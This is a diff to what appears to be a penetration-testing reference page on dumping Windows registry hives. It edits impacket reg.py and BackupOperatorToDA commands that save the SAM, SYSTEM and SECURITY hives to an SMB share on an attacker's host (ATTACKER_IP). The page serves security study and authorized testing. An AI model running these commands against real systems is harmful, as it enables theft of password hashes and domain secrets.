@@ -44,13 +44,12 @@ SAM and LSA secrets can be dumped either locally or remotely from the mounted re
 smbserver.py -smb2support "someshare" "./"
 
 # save each hive manually
-reg.py "domain"/"user":"password"@"target" save -keyName 'HKLM\SAM' -o '\\ATTACKER_IPs\someshare'
-reg.py "domain"/"user":"password"@"target" save -keyName 'HKLM\SYSTEM' -o '\\ATTACKER_IP\someshare'
-reg.py "domain"/"user":"password"@"target" save -keyName 'HKLM\SECURITY' -o '\\ATTACKER_IP\someshare'
+reg.py "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET" save -keyName 'HKLM\SAM' -o '\\$ATTACKER_IPs\someshare'
+reg.py "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET" save -keyName 'HKLM\SYSTEM' -o '\\$ATTACKER_IP\someshare'
+reg.py "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET" save -keyName 'HKLM\SECURITY' -o '\\$ATTACKER_IP\someshare'
 
 # backup all SAM, SYSTEM and SECURITY hives at once
-reg.py "domain"/"user":"password"@"target" backup -o '\\ATTACKER_IP\someshare'
-```
+reg.py "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET" backup -o '\\$ATTACKER_IP\someshare'
 
 
 === Live Windows
@@ -69,7 +68,7 @@ This operation can be conducted remotely with [BackupOperatoToDA](https://github
 > The attacker can start an SMB server, and indicate an UNC path including his IP address so that the hives get exported directly to his server.
 
 ```bash
-BackupOperatorToDA.exe -d "domain" -u "user" -p "password" -t "target" -o "\\ATTACKER_IP\someshare"
+BackupOperatorToDA.exe -d $DOMAIN -u $USER -p $PASSWORD -t $TARGET -o "\\ATTACKER_IP\someshare"
 ```
 
 > [!TIP]
